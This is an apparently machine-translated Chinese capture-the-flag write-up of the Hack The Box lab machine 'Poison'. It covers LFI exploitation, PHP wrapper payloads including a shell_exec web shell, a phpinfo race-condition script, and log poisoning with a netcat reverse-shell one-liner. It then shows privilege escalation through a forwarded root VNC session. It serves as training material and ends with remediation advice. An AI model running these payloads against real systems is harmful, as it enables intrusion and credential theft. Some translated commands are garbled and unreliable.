

![](https://miro.medium.com/max/1156/1*N-q7Pj36SfSkKnJZct4Y3Q.png)

让我们开始吧！

首先，我们运行快速的初始 nmap 扫描以查看哪些端口是开放的以及哪些服务正在这些端口上运行。

```
nmap -sC -sV -O -oA 初始 10.10.10.84
```

*   **\-sC** : 运行默认的 nmap 脚本
*   **\-sV** : 检测服务版本
*   **\-O** : 检测操作系统
*   **\-oA** : 输出所有格式并存储在_初始_文件中

我们返回以下结果，显示 2 个端口已打开：

*   **端口 22：** 运行 OpenSSH 7.2
*   **端口 80：** 运行 Apache httpd 2.4.29

```
在 2020-01-03 22:13 EST开始 Nmap 7.80 ( [https://nmap.org](https://nmap.org/) )   
10.10.10.84  
主机的Nmap 扫描报告 已启动（0.031 秒延迟）。   
未显示：998 个关闭端口   
端口状态服务版本   
22/tcp 打开 ssh OpenSSH 7.2 (FreeBSD 20161230; 协议 2.0)   
| ssh 主机密钥：   
| 2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)   
| 256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)   
|\_ 256 0b:8f:d5:71:85:90: 13:85:61:8b:eb:34:13:5f:94:3b (ED25519)   
80/tcp 打开 http Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)   
| \_http \-server-header: Apache /2.4.29 (FreeBSD) PHP/5.6.32   
| \_http \-title: 站点没有标题 (text/html; charset=UTF-8)。  
没有与主机完全匹配的操作系统（如果您知道其上运行的是什么操作系统，请参阅[https://nmap.org/submit/](https://nmap.org/submit/)）。  
TCP/IP指纹：  
OS:SCAN(V=7.80%E=4%D=1/3%OT=22%CT=1%CU=35958%PV=Y%DS=2%DC=I%G=Y %TM=5E1002E4  
.....  
网络距离：2 跳  
服务信息：操作系统：FreeBSD；CPE: cpe:/o:freebsd:freebsd已执行操作系统和服务检测。请在[https://nmap.org/submit/](https://nmap.org/submit/)报告任何不正确的结果。  
Nmap 完成：1 个 IP 地址（1 个主机启动）在 28.65 秒内扫描
```

在我们开始调查这些端口之前，让我们在后台运行更全面的 nmap 扫描，以确保我们涵盖所有基础。

让我们运行一个覆盖所有端口的 nmap 扫描。

```
nmap -sC -sV -p- -oA 完整 10.10.10.84
```

没有其他端口打开。

同样，我们在启用**\-sU**标志的情况下运行 nmap 扫描以运行 UDP 扫描。

```
nmap -sU -p- -oA udp 10.10.10.84
```

我们得到以下结果，表明没有其他端口打开。

```
在 2020-01-03 22:16 EST开始 Nmap 7.80 ( [https://nmap.org](https://nmap.org/) )   
10.10.10.84  
主机的Nmap 扫描报告已启动（0.034 秒延迟）。  
未显示：65534 个关闭端口  
PORT STATE SERVICE   
514/udp open|filtered syslogNmap 完成：3340.51 秒内扫描了 1 个 IP 地址（1 个主机）
```

在我们继续枚举之前，让我们对 nmap 扫描结果做一些心理记录。

*   在端口 22 上运行的 OpenSSH 版本与任何严重漏洞无关，因此除非我们找到凭据，否则我们不太可能通过此端口获得初始访问权限。
*   端口 80 正在运行 Web 服务器，因此我们将在其上执行我们的标准枚举技术。

我总是首先枚举 HTTP。

**80端口**

在浏览器中访问应用程序。

![](https://miro.medium.com/max/1400/1*6vTsCaMX9HFDrTmZbFnvcA.png?q=20)

![](https://miro.medium.com/max/1400/1*6vTsCaMX9HFDrTmZbFnvcA.png)

这是一个简单的网站，它接收脚本名称并执行它。我们得到了要测试的脚本列表，所以让我们一一测试它们。ini.php 和 info.php 脚本没有给我们任何有用的东西。phpinfo.php 脚本为我们提供了有关 PHP 服务器配置的丰富信息。listfiles.php 脚本为我们提供了以下输出。

```
数组  
(   
 \[0\] => .   
 \[1\] => ..   
 \[2\] => browse.php   
 \[3\] => index.php   
 \[4\] => info.php   
 \[5\] => ini.php   
 \[6\] => listfiles.php   
 \[7\] => phpinfo.php   
 \[8\] => pwdbackup.txt   
)
```

pwdbackup.txt 文件看起来很有趣。让我们看看我们是否可以在应用程序中查看它。

![](https://miro.medium.com/max/1400/1*d0IU2Te57a2xHqS257inVA.png?q=20)

![](https://miro.medium.com/max/1400/1*d0IU2Te57a2xHqS257inVA.png)

我们得到以下输出。

```
这个密码是安全的，它至少被编码了 13 次......真的会出什么问题......Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVUbGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBSbVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVWM040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRsWmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYyeG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01GWkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYwMXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVaT1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5kWFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZkWGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZTVm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZzWkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBWVmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpOUkd4RVdub3dPVU5uUFQwSwo =
```

根据输出，我们可以推断应用程序没有验证用户输入，因此容易受到本地文件包含 (LFI) 的影响。根据评论，该文件包含一个经过编码的密码。在我们继续解码密码并尝试使用它通过 SSH 连接到帐户之前，让我们看看我们是否可以将 LFI 转换为远程文件包含 (RFI)。

我们可以尝试几种方法。

**PHP http:// 包装器**

PHP http 包装器允许您访问 URL。漏洞利用的语法是：

```
http://\[远程文件路径\]
```

启动一个简单的python服务器。

```
python -m SimpleHTTPServer 5555
```

尝试运行托管在服务器上的文件。

![](https://miro.medium.com/max/1400/1*XRX5FZPgJIMgfw_c-ayQHw.png?q=20)

![](https://miro.medium.com/max/1400/1*XRX5FZPgJIMgfw_c-ayQHw.png)

我们收到一条错误消息，通知我们 http:// 包装器已禁用。同样，我们可以尝试 ftp:// 但它也被禁用。

**PHP expect:// 包装器**

PHP expect 包装器允许您运行系统命令。漏洞利用的语法是：

```
期望：//\[命令\]
```

默认情况下未启用此功能，因此让我们检查一下我们的应用程序是否启用了它。使用 Burp 拦截请求并尝试运行“id”命令。

![](https://miro.medium.com/max/1400/1*6jejQhxQb7v7xX4PHQ0fQg.png?q=20)

![](https://miro.medium.com/max/1400/1*6jejQhxQb7v7xX4PHQ0fQg.png)

我们收到一条错误消息，通知我们未配置 PHP 期望包装器。

**PHP input:// 包装器**

input:// 包装器允许您从请求正文中读取原始数据。因此，您可以使用它通过 POST 请求发送有效负载。请求的语法是：

```
php://input&cmd=\[命令\]
```

发布数据的语法是：

```
<?php echo shell\_exec($GET\['cmd'\]); ?>
```

这对我们的要求不起作用，但我认为值得一提。您可以尝试其他几种本博客中未提及的技术。但是，我相信该应用程序不易受到 RFI 的影响，因此我将继续。

您应该知道的一项有用技术是如何使用 filter:// 包装器查看文件的源代码。

**PHP过滤器：//包装器**

执行 index.php 等文件时，页面仅显示脚本的输出。要查看源代码，您可以使用 filter:// 包装器。

```
php://filter/convert.base64-encode/resource=\[文件名\]
```

这将以 base64 对页面进行编码并输出编码后的字符串。

例如，要查看 ini.php 文件，请运行以下命令。

![](https://miro.medium.com/max/1400/1*ENEGB6rnCEqDsHKGCKAoEg.png?q=20)

![](https://miro.medium.com/max/1400/1*ENEGB6rnCEqDsHKGCKAoEg.png)

这为您提供了源代码的 base64 编码版本。解码字符串。

```
echo "PD9waHAKcHJpbnRfcihpbmlfZ2V0X2FsbCgpKTsKPz4K" | base64 --解码
```

你得到源代码。

```
<?php   
print\_r(ini\_get\_all());   
?>
```

我们在解决这台机器时有点分歧，上述所有测试的结论是它不易受到 RFI 的影响。因此，让我们继续在系统上获得初步立足点。

可以通过三种方式获得最初的立足点。

*   解码 pwdbackup.txt 文件并使用解码后的密码通过 SSH 连接到用户帐户。
*   phpinfo.php 文件中的竞争条件利用，将 LFI 转换为 RCE。
*   将 LFI 转换为 RCE 的日志中毒利用。

我最初使用方法 1 访问机器，然后在观看[ippsec 的视频](https://www.youtube.com/watch?v=rs4zEwONzzk)后利用方法 2 和 3 。

**方法一：pwdbackup.txt**

pwdbackup.txt 文件的输出提示我们密码至少编码了 13 次，所以让我们编写一个简单的 bash 脚本来解码它。

```
#!/bin/bash#secret.txt 包含编码文本  
secret=$(<secret.txt)对于 {1..13} 中的 i；do   
 secret=$(<<<"$secret" base64 --decode)   
done   
echo "$secret"
```

将脚本保存在名为 decode.sh 的文件中并运行它。

```
root@kali:~/Desktop/htb/poison# ./decode.sh   
Charix!2#4%6&8(0
```

我们取回密码。我们想尝试使用此密码通过 SSH 登录到用户的帐户，但是，我们没有用户名。让我们尝试使用 LFI 漏洞来实现它。在 Scriptname 字段中输入以下字符串以输出 /etc/passwd 文件。

```
/etc/passwd
```

我们取回以下数据（截断）。

```
\# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $   
\#   
root:\*:0:0:Charlie &:/root:/bin/csh   
toor:\*:0 :0:Bourne-again 超级用户:/root:   
.....   
charix:\*:1001:1001:charix:/home/charix:/bin/csh
```

只有两个用户有登录 shell：root 和 charix。考虑到我们找到的密码，我们知道它属于 Charix。

使用我们找到的凭据通过 SSH 连接到 Charix 帐户。

```
ssh charix@10.10.10.84 
```

查看 user.txt 标志。

![](https://miro.medium.com/max/1318/1*6LIz4nn7HtwdJAb79pRtfw.png?q=20)

![](https://miro.medium.com/max/1318/1*6LIz4nn7HtwdJAb79pRtfw.png)

**方法二：phpinfo.php 竞争条件**

2011 年，发表了[这篇研究论文](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf)，概述了可以将 LFI 漏洞转变为远程代码执行 (RCE) 漏洞的竞争条件。需要以下服务器端组件来满足此可利用条件：

*   LFI 漏洞
*   任何显示 PHPInfo() 配置输出的脚本

正如我们在枚举阶段看到的，Poison htb 服务器满足这两个条件。因此，让我们下载[脚本](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/phpinfolfi.py)并对其进行修改以满足我们的需要。

首先，更改有效负载以包含以下默认情况下在 kali 上可用的反向 shell。

```
/usr/share/laudanum/php/php-reverse-shell.php
```

确保编辑 IP 地址和端口。接下来，将 LFIREQ 参数更改为我们应用程序中的参数。

```
LFIREQ="""GET /browse.php?file=%s
```

您还必须将所有“=>”更改为“=>”，以便脚本正确编译。

这就是修改脚本的目的。现在，设置一个侦听器来接收 shell。

```
nc -nlvp 1234
```

运行脚本。

```
蟒蛇 phpinfolfi.py 10.10.10.84 80
```

我们得到一个壳！

![](https://miro.medium.com/max/1400/1*s_GIfAvOavOqE_ACMDSlNw.png?q=20)

![](https://miro.medium.com/max/1400/1*s_GIfAvOavOqE_ACMDSlNw.png)

**方法三：原木中毒**

考虑到盒子被称为“毒药”，这可能是解决机器的预期方法。日志中毒是一种用于从 LFI 漏洞中获取 RCE 的常用技术。它的工作方式是攻击者试图将恶意输入注入服务器日志。然后利用LFI漏洞，调用服务器日志从而执行注入的恶意代码。

所以我们需要做的第一件事就是找到服务器上正在使用的日志文件。快速谷歌搜索告诉我们，freebsd 将日志文件保存在以下位置。

```
/var/log/httpd-access.log
```

访问日志中的示例条目是：

```
10.10.14.12 - - \[05/Jan/2020:06:20:15 +0100\]“GET /browse.php?file=php://filter/convert.base64-encode/resource=ini.php HTTP/1.1” 200 44 " [http://10.10.10.84/](http://10.10.10.84/) " "Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101 Firefox/68.0"
```

请注意，正在记录用户代理“ _Mozilla/5.0 (X11; Linux x86\_64; rv:68.0) Gecko/20100101 Firefox/68.0_ ”。由于用户代理完全在我们的控制之下，我们可以简单地更改它以将反向 shell 发送回我们的机器。

在 Burp 中拦截请求并将用户代理从[pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)更改为反向 shell 。

```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 6666 >/tmp/f') ?>
```

设置一个监听器来接收反向shell。

```
nc -nlvp 6666
```

在 Burp 中执行请求，以便将 PHP 代码保存在日志文件中。使用 LFI 漏洞调用日志文件，然后执行反向 shell。

```
[http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log](http://10.10.10.84/browse.php?file=%2Fvar%2Flog%2Fhttpd-access.log)
```

我们得到一个壳！

![](https://miro.medium.com/max/1400/1*ov6P4njioA4mjDaHBHat2Q.png?q=20)

![](https://miro.medium.com/max/1400/1*ov6P4njioA4mjDaHBHat2Q.png)

由于机器运行的是 freeBSD 操作系统，因此 LinEnum 脚本将无法在其上运行。因此，我们将不得不求助于手动枚举方法。

如果您列出 Charix 主目录中的文件，您将找到一个 secret.zip 文件。

```
charix@Poison:~ % ls -l   
total 8   
\-rw-r----- 1 root charix 166 Mar 19 2018 secret.zip   
\-rw-r----- 1 root charix 2018 年 3 月 19 日 user.txt
```

如果您尝试解压缩文件，它会要求输入密码。让我们首先将文件传输到我们的攻击机。

```
scp charix@10.10.10.84:/home/charix/secret.zip 。
```

尝试使用 Charix 的 SSH 密码解压文件。大多数用户的重复使用密码。

```
解压秘密.zip
```

有用！检查文件类型。

```
root@kali:~/Desktop/htb/poison# file secret   
secret：非 ISO 扩展 ASCII 文本，没有行终止符
```

该文件似乎已编码。在我们继续找出正在使用的编码类型之前，让我们暂时搁置它并进行更多枚举。

在目标机器上，运行 ps 命令来查看哪些进程正在运行。

```
ps -aux
```

有一个 VNC 进程正在以 root 身份运行。

```
root 529 0.0 0.7 23620 7432 v0-I Fri23 0:00.04 Xvnc :1 -desktop X -httpd /usr/local/sha
```

让我们查看整个过程信息。

```
charix@Poison:~ % ps -auxww | grep vnc   
root 529 0.0 0.7 23620 7432 v0-I Fri23 0:00.04 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth12rb00wait0 rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

VNC 是一个远程访问软件。\-rfbport 标志告诉我们它正在侦听本地主机上的端口 5901。

我们可以使用 netstat 命令来验证。

```
charix@Poison:~ % netstat -an | grep LIST   
tcp4 0 0 127.0.0.1.25 \*.\* LISTEN   
tcp4 0 0 \*.80 \*.\* LISTEN   
tcp6 0 0 \*.80 \*.\* LISTEN   
tcp4 0 0 \*.22 \*.\* LISTEN   
tcp6 0 0 \*.22 \*.\*  
听 tcp4 0 0 127.0.0.1.5801 \*.\*  
听 tcp4 0 0 127.0.0.1.5901 \*.\* 听
```

由于 VNC 是图形用户界面软件，我们无法通过目标机器访问它。我们需要端口转发。

```
\# ssh -L \[local-port\]:\[remote-ip\]:\[remote-port\]   
ssh -L 5000:127.0.0.1:5901 charix@10.10.10.84
```

上面的命令分配了一个套接字来从我的攻击机 (kali) 侦听 localhost 上的端口 5000。每当连接到端口 5000 时，该连接就会通过安全通道转发并连接到目标机器上本地主机上的端口 5901（毒药）。

我们可以使用 netstat 验证该命令是否有效。

```
root@kali:~/Desktop/htb/poison# netstat -an | grep LIST   
tcp 0 0 127.0.0.1:5000 0.0.0.0:\* LISTEN   
tcp6 0 0 ::1:5000 :::\* LISTEN
```

现在端口转发已设置，让我们连接到攻击机上的 VNC。

```
root@kali:~/Desktop/htb/poison# vncviewer 127.0.0.1:5000  
连接到 RFB 服务器，使用协议版本 3.8  
启用 TightVNC 协议扩展  
执行标准 VNC 身份验证  
密码：
```

我试过 Charix 的密码，但没有用。然后我在 google 上搜索了“vnc 密码”，并在手册页上找到了以下描述。

![](https://miro.medium.com/max/802/1*jQwwoJMoBXfU1BhRGjjYCw.png?q=20)

![](https://miro.medium.com/max/802/1*jQwwoJMoBXfU1BhRGjjYCw.png)

设置 VNC 密码时，密码会被混淆并作为文件保存在服务器上。可以使用 passwd 选项包含混淆的密码文件，而不是直接输入密码。在本博客的早些时候，我们发现了一个我们不知道在哪里使用的秘密文件。那么让我们看看它是否是我们正在寻找的混淆密码文件。

```
vncviewer 127.0.0.1:5000 -passwd 秘密
```

我们进去了！

![](https://miro.medium.com/max/1400/1*k_1NH-bUsfMMvByRSWSPjQ.png?q=20)

![](https://miro.medium.com/max/1400/1*k_1NH-bUsfMMvByRSWSPjQ.png)

VNC 以 root 权限运行，因此我们可以查看 root.txt 文件。

![](https://miro.medium.com/max/1400/1*PI-IzUmDv4Hn17f5CWPhWw.png?q=20)

![](https://miro.medium.com/max/1400/1*PI-IzUmDv4Hn17f5CWPhWw.png)

在我们结束这篇博客之前，让我们检查一下是否有任何在线工具可以解码混淆的密码文件。由于它没有加密，我们应该能够在没有密码的情况下将其反转。

经过一番谷歌搜索，我找到了这个[github 存储库](https://github.com/trinitronx/vncpasswd.py)，它为我们完成了这项工作。克隆存储库并在我们的文件上运行脚本。

```
python vncpasswd.py -d -f ../../htb/poison/secret
```

*   **\-d：** 解密
*   **\-f：** 文件

我们得到以下输出，显示明文密码是“VNCP@$$!”。

```
无法从 Linux 系统上的 Windows 注册表读取  
无法写入 Linux 系统上的 Windows 注册表  
Decrypted Bin Pass='VNCP@$$!'   
解密的十六进制密码 = '564e435040242421'
```

现在我们知道了密码，我们可以使用明文密码而不是混淆的密码文件直接登录 VNC。

为了在盒子上获得初步立足点，我们利用了四个漏洞。

1.  LFI 漏洞允许我们枚举文件并调用和执行我们存储在服务器上的恶意代码。如果开发人员验证用户输入，这可以很容易地避免。
2.  敏感信息披露。包含用户 SSH 密码的 pwdbackup.txt 文件公开存储在服务器上，供任何人阅读。由于文件的内容被编码而不是加密，我们能够轻松地反转内容并获得明文密码。如果密码文件没有公开存储在服务器上并且使用强加密算法来加密文件，则可以避免这种情况。
3.  日志文件中毒。由于日志文件在没有任何输入验证的情况下存储用户代理（用户控制的数据），我们能够将恶意代码注入我们使用 LFI 漏洞执行的服务器中。同样，如果开发人员验证用户输入，这可以很容易地避免。
4.  导致 phpinfo.php 文件中的竞争条件的安全配置错误。这需要存在两个条件：(1) 我们已经讨论过的 LFI 漏洞，以及 (2) 显示 phpinfo() 配置输出的脚本。管理员应该在所有生产环境中禁用 phpinfo() 功能。

为了提升权限，我们利用了一个漏洞。

1.  重用密码。包含 VNC 密码的 zip 文件是使用 Charix 的 SSH 密码加密的。我们真正应该问的问题是，为什么让您访问 root 帐户的密码使用较低特权用户的密码进行加密？针对此漏洞的修复建议是显而易见的。

21 台机器停机，还有 26 台机器继续运行！

![](https://miro.medium.com/max/1400/1*nx-rDq5Gl8JlsGxv6evr2A.png?q=20)

![](https://miro.medium.com/max/1400/1*nx-rDq5Gl8JlsGxv6evr2A.png)